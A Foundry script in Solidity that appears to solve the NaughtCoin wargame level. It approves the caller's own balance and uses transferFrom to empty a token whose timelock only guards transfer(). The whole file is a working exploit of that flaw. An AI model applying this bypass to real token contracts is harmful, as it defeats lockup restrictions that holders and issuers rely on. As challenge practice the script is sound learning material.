// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {IERC20} from "../src/Lv-15/NaughtCoin.sol";

contract NaughtCoinScript is Script {
    function run() public {
        vm.startBroadcast();
        //REPLACE ADDRESS WITH YOUR OWN NaughtCoin INSTANCE ADDRESS
        IERC20 coin = IERC20(0xD0a095767999b35A4f43cC47fa9D09De4acfB94a);
        uint bal = coin.balanceOf(msg.sender);
        coin.approve(msg.sender, bal+1);
        coin.transferFrom(msg.sender, address(0x1), bal);
        vm.stopBroadcast();
    }
}
